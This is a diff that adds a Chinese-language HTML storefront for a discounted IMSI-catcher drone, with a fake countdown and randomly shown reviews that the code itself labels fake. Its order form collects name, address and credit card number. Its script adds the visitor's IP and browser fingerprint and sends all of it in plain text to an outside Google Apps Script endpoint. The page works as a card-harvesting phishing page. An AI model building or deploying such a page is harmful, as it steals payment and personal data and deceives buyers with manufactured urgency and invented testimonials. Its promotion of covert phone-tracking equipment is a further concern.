@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>限時優惠！購買M化無人機，提升執法效率！</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            margin: auto;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .btn:disabled {
+            background-color: #ccc;
+        }
+        .fake-reviews {
+            text-align: left;
+            margin-top: 20px;
+        }
+        .fake-reviews p {
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+        .discount {
+            color: red;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        .original-price {
+            text-decoration: line-through;
+            color: #999;
+        }
+        #countdown {
+            font-size: 18px;
+            color: #d9534f;
+            margin-top: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        form input, form select {
+            margin-bottom: 10px;
+            padding: 8px;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .success-message {
+            display: none;
+            color: green;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>限時優惠！購買M化無人機，提升執法效率！</h1>
+        <iframe width="560" height="315" src="https://www.youtube.com/embed/VVKTwv5aLAA?si=esYIjkhuyVTWmjrs" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+        <p class="original-price">$128880</p>
+        <p class="discount">限時優惠價：$8888</p>
+        <div id="countdown">限時倒數：<span id="timer">05:00</span></div>
+        <form id="orderForm">
+            <select name="model" required>
+                <option value="" disabled selected>選擇型號</option>
+                <option value="IMSI01">IMSI01</option>
+                <option value="IMSI02">IMSI02</option>
+            </select>
+            <select name="color" required>
+                <option value="" disabled selected>選擇顏色</option>
+                <option value="黑色">黑色</option>
+                <option value="白色">白色</option>
+            </select>
+            <input type="text" name="name" placeholder="收件人姓名" required>
+            <input type="text" name="address" placeholder="收件地址" required>
+            <input type="text" name="creditCard" placeholder="信用卡號" required>
+            <button class="btn" type="submit">提交訂單</button>
+        </form>
+        <div class="success-message" id="successMessage">恭喜您！成功參與限時優惠，您的訂單已提交！</div>
+        <div class="description">
+            <h2>產品介紹</h2>
+            <p><strong>超強M化無人機</strong></p>
+            <p>M化無人機搭載最新的IMSI捕獲器，專為執法和搜救設計。這款高科技設備能夠搜索並追蹤手機信號，並通過識別IMSI號碼來定位目標。</p>
+            <p>IMSI捕獲器支持2G、3G、4G和5G的通訊標準，並與無人機的優勢結合，提供高效的搜救和執法監控解決方案。</p>
+            <ul>
+                <li>探測可見和不可見目標；可在高達200米的高度和地下6米的深度探測手機。</li>
+                <li>定位精度達到10米，與便攜式IMSI捕獲器配合使用時精度可達1米以內。</li>
+                <li>每分鐘可收集400個終端數據。</li>
+                <li>配備的電池可持續飛行超過30分鐘。</li>
+            </ul>
+            <p><em>The drone-mounted IMSI Catcher supports telecommunication standards of 2G, 3G, 4G, and 5G. It detects visible and invisible targets, capable of detecting mobile phones at a height of up to 200 meters, and underground depth of up to 6 meters. Positioning accuracy reaches 10 meters independently, and less than 1 meter when working with the portable IMSI catcher. Data of 400 terminals can be collected per minute, with a flight time of over 30 minutes on a single pair of batteries.</em></p>
+        </div>
+        <div class="fake-reviews">
+            <h2>用戶好評</h2>
+        </div>
+    </div>
+    <script>
+        const reviewsData = [
+            { name: '賴○○', email: 'moOOO@hotmail.com', location: '苗栗縣', review: '這款無人機功能強大，能輕鬆定位目標，執法效率大大提升！' },
+            { name: '張○○', email: 'coOOO@yahoo.com', location: '屏東縣', review: '性能優異，價格實惠，值得每個執法人員擁有！' },
+            { name: '黃○○', email: 'kaOOO@gmail.com', location: '臺南市', review: '操作簡便，效果顯著，絕對超值選擇！' },
+            { name: '徐○○', email: 'hoOOO@gmail.com', location: '南投縣', review: '這款無人機幫助我們成功完成了多次行動，強烈推薦！' },
+            { name: '何○○', email: 'peOOO@gmail.com', location: '彰化縣', review: '穩定性極高，信號捕捉能力一流，無人機中的頂尖產品！' },
+            { name: '鍾○○', email: 'zaOOO@icloud.com', location: '雲林縣', review: '購買後再也不用擔心搜索目標的問題了，真的是執法神器！' },
+            { name: '鄭○○', email: 'elOOO@gmail.com', location: '高雄市', review: '這款無人機讓我們的工作更加高效，節省了大量時間！' },
+            { name: '莊○○', email: 'stOOO@gmail.com', location: '花蓮縣', review: '處理迅速，商家服務非常好，會再回購！' },
+            { name: '林○○', email: 'seOOO@icloud.com', location: '彰化縣', review: '收到貨很快，產品質量也很好，非常滿意！' },
+            { name: '楊○○', email: 'waOOO@gmail.com', location: '臺中市', review: '產品性能超出預期，物超所值！' },
+            { name: '吳○○', email: 'duOOO@gmail.com', location: '臺中市', review: '無人機功能齊全，非常適合執法用途！' },
+            { name: '賴○○', email: 'doOOO@icloud.com', location: '臺中市', review: '這是我用過最好的無人機，推薦給所有人！' },
+            { name: '陳○○', email: 'mrOOO@hotmail.com', location: '臺北市', review: '無人機很快就收到了，質量非常好！' },
+            { name: '施○○', email: 'reOOO@outlook.com', location: '雲林縣', review: '操作簡單，效果卓越，值得推薦！' },
+            { name: '黃○○', email: 'grOOO@gmail.com', location: '高雄市', review: '性價比超高，無人機功能強大！' },
+            { name: '顏○○', email: 'veOOO@outlook.com', location: '彰化縣', review: '無人機性能穩定，非常滿意這次購買！' },
+            { name: '徐○○', email: 'luOOO@outlook.com', location: '屏東縣', review: '商家服務態度好，處理速度快，非常滿意！' },
+            { name: '游○○', email: 'fiOOO@gmail.com', location: '桃園市', review: '收到貨後立即使用，效果非常好！' },
+            { name: '楊○○', email: 'paOOO@yahoo.com', location: '嘉義市', review: '無人機質量上乘，會再回購！' },
+            { name: '何○○', email: 'jeOOO@gmail.com', location: '臺北市', review: '性能超群，無人機效果非常好！' }
+        ];
+
+        function shuffle(array) {
+            for (let i = array.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [array[i], array[j]] = [array[j], array[i]];
+            }
+            return array;
+        }
+
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://ifconfig.me/ip');
+                const ip = await response.text();
+                return ip.trim();
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'IP未知';
+            }
+        }
+
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        function getTaipeiTime() {
+            const now = new Date();
+            const utc8Offset = 8 * 60; // UTC+8 offset in minutes
+            const taipeiTime = new Date(now.getTime() + (now.getTimezoneOffset() + utc8Offset) * 60000);
+            return taipeiTime.toISOString().replace('T', ' ').substring(0, 19);
+        }
+
+        async function submitOrder(event) {
+            event.preventDefault();
+            const form = document.getElementById('orderForm');
+            const formData = new FormData(form);
+            const data = {};
+            let isValid = true;
+            formData.forEach((value, key) => {
+                if (!value) {
+                    isValid = false;
+                }
+                data[key] = value;
+            });
+
+            if (!isValid) {
+                alert('親，沒填妥送件資訊沒辦法將這優惠產品送給您唷，限時優惠即將到期，請盡速把握！');
+                return;
+            }
+
+            // 獲取用戶IP和瀏覽器資訊
+            const ip = await getUserIP();
+            const browserInfo = getBrowserInfo();
+            const taipeiTime = getTaipeiTime();
+            data.ip = ip;
+            data.browserInfo = JSON.stringify(browserInfo);
+            data.taipeiTime = taipeiTime;
+
+            const queryString = new URLSearchParams(data).toString();
+
+            fetch(`https://script.google.com/macros/s/AKfycbzRx1m3OmJYVt2vWutaj5vukcozGRdNbE2zk6D3H9uCchJ-rypN18kBSSHvkRbnb7W6/exec?${queryString}`, {
+                method: 'GET',
+                mode: 'no-cors' // 使用 no-cors 模式
+            }).then(() => {
+                document.getElementById('successMessage').style.display = 'block';
+                alert('恭喜您！成功參與限時優惠，您的訂單已提交！');
+            }).catch(error => {
+                console.error('Error:', error);
+                alert('訂單提交失敗，請稍後再試。');
+            });
+        }
+
+        document.getElementById('orderForm').addEventListener('submit', submitOrder);
+
+        // 倒數計時
+        let time = 300; // 5 分鐘倒數
+        const timerElement = document.getElementById('timer');
+        const countdown = setInterval(() => {
+            const minutes = Math.floor(time / 60);
+            const seconds = time % 60;
+            timerElement.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            time--;
+            if (time < 0) {
+                clearInterval(countdown);
+                document.getElementById('countdown').textContent = '優惠已結束';
+                document.querySelector('.btn').disabled = true;
+            }
+        }, 1000);
+
+        // 隨機顯示假好評
+        const reviewsContainer = document.querySelector('.fake-reviews');
+        let reviewIndex = 0;
+        const shuffledReviews = shuffle(reviewsData);
+        function showReview() {
+            if (reviewIndex < shuffledReviews.length) {
+                const review = document.createElement('p');
+                review.innerText = `${shuffledReviews[reviewIndex].name} (${shuffledReviews[reviewIndex].location}): ${shuffledReviews[reviewIndex].review}`;
+                reviewsContainer.appendChild(review);
+                setTimeout(() => {
+                    review.style.opacity = 1;
+                }, 100); // 延遲顯示
+                reviewIndex++;
+                const randomDelay = Math.random() * 2000 + 1000; // 隨機1-3秒
+                setTimeout(showReview, randomDelay);
+            }
+        }
+        showReview();
+    </script>
+</body>
+</html>
